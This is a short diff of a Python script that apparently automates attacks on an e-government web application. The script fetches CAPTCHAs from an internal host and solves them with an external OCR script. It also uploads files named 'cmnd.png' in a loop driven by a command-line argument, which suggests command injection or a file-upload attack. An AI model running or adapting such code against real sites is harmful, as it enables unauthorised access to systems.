@@ -17,12 +17,12 @@ while 1:
 	urlx = "http://192.168.250.250/egov/php/create_captcha.php?_CAPTCHA&" + ix
 	# print url
 	rx = requests.get(urlx,headers = head,cookies=cx)
-	output = open("captcha.jpg","wb")
+	output = open("/captcha.jpg","wb")
 	output.write(rx.content)
 	output.close()
-	os.system("python main.py captcha.jpg")
+	os.system("python /web/main.py /captcha.jpg")
 	c = {'PHPSESSID':sessid}
-	f=open("out.txt","r")
+	f=open("/out.txt","r")
 	captcha=f.read(5)
 	f.close()
 ##
@@ -39,8 +39,8 @@ while 1:
 m = re.compile(r"alert\(\"(?P<a>[a-z A-Z!]+)\"\)")
 #
 #
-file1 = open("screenshot.gif").read()
-file2 = open("screenshot.gif").read()
+file1 = open("/web/screenshot.gif").read()
+file2 = open("/web/screenshot.gif").read()
 files = {'file1': ('cmnd.png', file1, 'image/png'), 'file2': ('cmnd.png', file2, 'image/png')}
 for i in range(int(sys.argv[2])):
         cmnd=sys.argv[1]
